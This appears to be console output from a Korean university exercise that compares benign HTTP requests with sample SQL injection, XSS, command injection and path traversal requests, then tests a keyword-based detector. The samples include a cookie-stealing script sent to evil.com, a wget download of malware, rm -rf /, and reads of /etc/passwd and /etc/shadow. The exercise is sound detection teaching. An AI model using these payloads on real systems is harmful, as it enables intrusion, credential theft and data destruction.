(venv) PS C:\Users\white\Desktop\강의\동양\빅데이터분석프로젝트\BigDataAnalysis\7_week> python attack_examples.py 
=================================================================
  [실습 1] 웹 공격 예시 체험 - 정상 vs 공격 요청 비교
=================================================================

─────────────────────────────────────────────────────────────────
  정상 요청 (Benign)
─────────────────────────────────────────────────────────────────
  1. GET /index.html HTTP/1.1
  2. GET /products?id=42&category=shoes HTTP/1.1
  3. POST /login HTTP/1.1  body: user=john&pw=mypass123
  4. GET /api/users/5 HTTP/1.1
  5. GET /images/logo.png HTTP/1.1

  >> 탐지 포인트: 특별한 패턴 없음. 일반적인 페이지 접근, 로그인, API 호출

─────────────────────────────────────────────────────────────────
  SQL Injection 공격
─────────────────────────────────────────────────────────────────
  1. GET /login?user=admin'-- HTTP/1.1
  2. GET /products?id=1 UNION SELECT username,password FROM users HTTP/1.1
  3. POST /search HTTP/1.1  body: q='; DROP TABLE users; --
  4. GET /login?user=admin&pw=' OR '1'='1 HTTP/1.1
  5. GET /api/users?id=1 OR 1=1 HTTP/1.1

  >> 탐지 포인트: ' (작은따옴표), --, UNION SELECT, OR 1=1, DROP TABLE 등 SQL 키워드

─────────────────────────────────────────────────────────────────
  XSS (Cross-Site Scripting) 공격
─────────────────────────────────────────────────────────────────
  1. GET /search?q=<script>alert('XSS')</script> HTTP/1.1
  2. POST /comment HTTP/1.1  body: msg=<img src=x onerror=alert(1)>
  3. GET /board?title=<iframe src='http://evil.com'></iframe> HTTP/1.1
  4. POST /profile HTTP/1.1  body: name=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
  5. GET /search?q=<svg onload=alert('hack')> HTTP/1.1

  >> 탐지 포인트: <script>, alert(, onerror=, <iframe>, <svg onload= 등 HTML/JS 태그

─────────────────────────────────────────────────────────────────
  Command Injection 공격
─────────────────────────────────────────────────────────────────
  1. GET /download?file=report.pdf; cat /etc/passwd HTTP/1.1
  2. POST /ping HTTP/1.1  body: host=8.8.8.8 | ls -la /
  3. GET /lookup?domain=google.com && wget http://evil.com/malware HTTP/1.1
  4. POST /convert HTTP/1.1  body: input=test; rm -rf / HTTP/1.1
  5. GET /api/exec?cmd=whoami HTTP/1.1

  >> 탐지 포인트: ; (세미콜론), | (파이프), &&, cat /etc, rm -rf, wget, whoami

─────────────────────────────────────────────────────────────────
  Path Traversal 공격
─────────────────────────────────────────────────────────────────
  1. GET /files/../../../etc/passwd HTTP/1.1
  2. GET /download?file=../../../etc/shadow HTTP/1.1
  3. GET /static/..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
  4. GET /files/....//....//etc/passwd HTTP/1.1
  5. GET /download?file=%00../../windows/system32/config/sam HTTP/1.1

  >> 탐지 포인트: ../ (상위 디렉토리), %2f (인코딩), /etc/passwd, %00 (널바이트)


=================================================================
  [실습 2] 간단한 규칙 기반 공격 탐지기 만들기
=================================================================

  [탐지 결과]
  요청(앞 50자)                                            | 탐지 결과              | 매칭 패턴
  ────────────────────────────────────────────────────-+-──────────────────-+-───────────────
  GET /index.html HTTP/1.1                             | Benign             | 
  GET /products?id=42&category=shoes HTTP/1.1          | Benign             | 
  POST /login HTTP/1.1  body: user=john&pw=mypass123   | Benign             | 
  GET /api/users/5 HTTP/1.1                            | Benign             | 
  GET /images/logo.png HTTP/1.1                        | Benign             | 
  GET /login?user=admin'-- HTTP/1.1                    | SQL Injection      | --
  GET /products?id=1 UNION SELECT username,password .. | SQL Injection      | union select
  POST /search HTTP/1.1  body: q='; DROP TABLE users.. | SQL Injection      | drop table
  GET /login?user=admin&pw=' OR '1'='1 HTTP/1.1        | SQL Injection      | ' or
  GET /api/users?id=1 OR 1=1 HTTP/1.1                  | SQL Injection      | 1=1
  GET /search?q=<script>alert('XSS')</script> HTTP/1.. | XSS                | <script>
  POST /comment HTTP/1.1  body: msg=<img src=x onerr.. | XSS                | alert(
  GET /board?title=<iframe src='http://evil.com'></i.. | XSS                | <iframe
  POST /profile HTTP/1.1  body: name=<script>documen.. | XSS                | <script>
  GET /search?q=<svg onload=alert('hack')> HTTP/1.1    | XSS                | alert(
  GET /download?file=report.pdf; cat /etc/passwd HTT.. | Command Injection  | ; cat
  POST /ping HTTP/1.1  body: host=8.8.8.8 | ls -la /   | Command Injection  | | ls
  GET /lookup?domain=google.com && wget http://evil... | Command Injection  | && wget
  POST /convert HTTP/1.1  body: input=test; rm -rf /.. | Command Injection  | rm -rf
  GET /api/exec?cmd=whoami HTTP/1.1                    | Command Injection  | whoami
  GET /files/../../../etc/passwd HTTP/1.1              | Path Traversal     | ../
  GET /download?file=../../../etc/shadow HTTP/1.1      | Path Traversal     | ../
  GET /static/..%2f..%2f..%2fetc%2fpasswd HTTP/1.1     | Path Traversal     | ..%2f
  GET /files/....//....//etc/passwd HTTP/1.1           | Path Traversal     | ../
  GET /download?file=%00../../windows/system32/confi.. | Path Traversal     | ../

  규칙 기반 탐지 정확도: 25/25 = 100.0%
  >> 규칙 기반 방법의 한계: 패턴이 조금만 변형되면 탐지 실패!


=================================================================
  [정리] 공격 유형별 데이터 특성 요약
=================================================================

  공격 유형          | 주요 탐지 특성              | 데이터에서의 패턴
  ──────────────────┼────────────────────────────┼──────────────────────
  SQL Injection     | URL/파라미터의 SQL 키워드   | 요청 길이 보통, 응답 큼
  XSS               | HTML/JS 태그 삽입          | 요청 길이 보통
  DDoS              | 대량 요청, 짧은 간격        | 패킷 수 많음, 간격 짧음
  DoS (Slow)        | 긴 연결 유지, 느린 전송     | 지속시간 매우 김, 패킷 적음
  Brute Force       | 반복적 로그인 시도          | 동일 포트 반복, 패킷 일정
  Bot               | 자동화된 규칙적 패턴        | 간격 표준편차 낮음
  Command Injection | OS 명령어 키워드            | 요청 길이 보통
  Path Traversal    | ../ 경로 조작              | 요청에 상위 경로 포함

  >> 다음 시간(2교시)에서 실제 데이터로 이 패턴들을 확인합니다!